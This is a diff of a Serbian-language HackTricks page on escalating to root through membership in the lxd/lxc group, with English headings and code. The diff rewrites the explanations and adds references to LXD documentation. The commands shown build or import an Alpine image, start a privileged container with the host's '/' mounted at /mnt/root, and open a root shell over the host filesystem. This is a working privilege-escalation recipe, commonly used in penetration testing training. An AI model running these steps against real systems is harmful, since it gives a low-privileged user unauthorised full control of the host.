@@ -1,18 +1,16 @@
 # lxd/lxc Group - Privilege escalation
 
-{{#include ../../../banners/hacktricks-training.md}}
-
-Ako pripadate _**lxd**_ ili _**lxc**_ **group**, možete postati root
+Članstvo u LXD management grupi na hostu (obično _**lxd**_) može omogućiti put do root privilegija jer pruža potpunu kontrolu nad daemon-om.<sup>[[1]](#references)</sup>
 
 ## Exploiting without internet
 
 ### Method 1
 
-Možete preuzeti alpine image koji ćete koristiti sa lxd iz pouzdanog repozitorijuma.  
-Canonical objavljuje dnevne buildove na svom sajtu: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
-Samo preuzmite i **lxd.tar.xz** i **rootfs.squashfs** iz najnovijeg builda. (Naziv direktorijuma je datum).
+Možete preuzeti Alpine image koji ćete koristiti sa LXD-om iz pouzdanog repository-ja.  
+Canonical-ov LXD image server objavljuje dnevne build-ove: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
+Preuzmite samo **lxd.tar.xz** i **rootfs.squashfs** iz najnovijeg build-a (ime direktorijuma je datum).<sup>[[8]](#references)</sup>
 
-Alternativno, možete instalirati ovaj distro builder na svojoj mašini: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (pratite uputstva na github-u):
+Alternativno, možete instalirati distrobuilder na svojoj mašini prateći [uputstva projekta](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
 ```bash
 # Install requirements
 sudo apt update
@@ -35,7 +33,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-Otpremite datoteke **incus.tar.xz** (**lxd.tar.xz** ako ste ih preuzeli iz Canonical repository-ja) i **rootfs.squashfs**, dodajte image u repo i kreirajte container:
+Otpremite **incus.tar.xz** (**lxd.tar.xz** ako ste preuzeli sa Canonical image servera) i **rootfs.squashfs**, zatim importujte image i kreirajte container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -52,17 +50,17 @@ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=t
 ```
 > [!CAUTION]
 > Ako pronađete ovu grešku _**Error: No storage pool found. Please create a new storage pool**_\
-> Pokrenite **`lxd init`** i podesite sve opcije na podrazumevane vrednosti. Zatim **ponovite** prethodni blok komandi.
+> Pokrenite **`lxd init`**, podesite podrazumevani storage pool, a zatim **ponovite prethodni niz komandi**.<sup>[[2]](#references)</sup>
 
-Na kraju možete izvršiti container i dobiti root pristup:
+Na kraju, pokrenite container i otvorite root shell nad datotečkim sistemom hosta:<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-### Metod 2
+### Method 2
 
-Izgradite Alpine image i pokrenite ga koristeći flag `security.privileged=true`, primoravajući container da komunicira kao root sa host filesystemom.
+Izgradite Alpine image i pokrenite ga sa flagom `security.privileged=true`, koji mapira root kontejnera na root hosta; mountovanje `/` zatim izlaže fajl-sistem hosta unutar kontejnera.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -82,4 +80,15 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 ```
+## References
+
+- [1] [Kako ojačati bezbednost za LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
+- [2] [LXD kontejneri i virtuelne mašine](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
+- [3] [Kako kopirati i uvesti image-e](https://canonical.com/lxd/docs/latest/howto/images_copy/)
+- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
+- [5] [Kako izgraditi image-e pomoću distrobuilder-a](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
+- [6] [Alpine definicija image-a](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
+- [7] [lxd-alpine-builder build skripta](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
+- [8] [LXD image server](https://images.lxd.canonical.com/)
+- [9] [Tip: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
 {{#include ../../../banners/hacktricks-training.md}}
